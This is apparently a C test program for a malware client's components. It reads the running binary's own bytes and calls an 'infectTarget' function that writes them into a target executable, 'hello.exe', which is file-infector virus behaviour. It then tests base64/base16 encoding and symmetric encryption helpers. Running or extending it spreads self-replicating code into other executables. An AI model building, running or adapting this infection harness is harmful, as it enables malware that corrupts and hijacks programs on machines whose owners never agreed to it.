#include "../../client/common/clonelib.h"
#include "../../client/common/common.h"
#include <stdio.h>
#define TEST_DIR "./playground/"
int main(int argc, char** argv){argc=argc;
	const char* test_string="Hungry";
	
	int status;

	//TEST CLONELIB
	char* gob;
	int gob_length;
	printf("Testing clonelib.h\n");
	
	//Test function getOwnBytes
	gob_length=getOwnBytes(&gob,argv[0]);
	printf("getOwnBytes:\t%s(%d bytes)\n",gob_length>256?"OK":"Failed",gob_length);

	//Test function infectTarget
	status=infectTarget(TEST_DIR"hello.exe",gob,gob_length);
	printf("infectTarget:\t%s\n",status?"OK":"Failed");
	
	//free
	free(gob);
	
	//TEST B64
	printf("\nTesting b64.h\n");
	int b64_decoded_msg_length;
	char* b64_decoded_msg;
	
	//Test function b64decode
	b64_decoded_msg_length=b64decode(&b64_decoded_msg,"T0s=");
	printf("b64decode:\t%s(%s)\n",(b64_decoded_msg_length==2 && !strcmp(b64_decoded_msg,"OK"))?"OK":"Failed",b64_decoded_msg);
	
	
	//Test functions b16decode and b16encode
	status=strcmp(b16decode(b16encode(test_string,strlen(test_string))),test_string);
	printf("b16en/decrypt:\t%s",status?"Failed":"OK");
	if(status)printf("(%d)",status);printf("\n");
	
	//free
	free(b64_decoded_msg);
	
	//Test CRYPT
	printf("\nTesting crypt.h\n");
	char* keyiv;
	char* encrypted_msg=(char*)malloc(strlen(test_string));
	char* decrypted_msg=(char*)malloc(strlen(test_string));
	
	//Test function secureRand
	status=secureRand(&keyiv,SYMMETRIC_IV_SIZE+SYMMETRIC_KEY_SIZE);
	printf("secureRand:\t%s\n",status?"OK":"Failed");
	
	//Test functions symEn/Decrypt
	status=symEncrypt(&encrypted_msg,keyiv,test_string,strlen(test_string));
	printf("symEncrypt:\t%s\n",status?"OK":"Failed");
	status=symDecrypt(&decrypted_msg,keyiv,encrypted_msg,strlen(test_string));
	printf("symDecrypt:\t%s\n",status?"OK":"Failed");
	printf("Together:\t%s(%s)\n",!strcmp(decrypted_msg,test_string)?"OK":"Failed",decrypted_msg);
	
	
	
	
	
	//Test encryption/description
	
	
	printf("\n");
	return 0;
}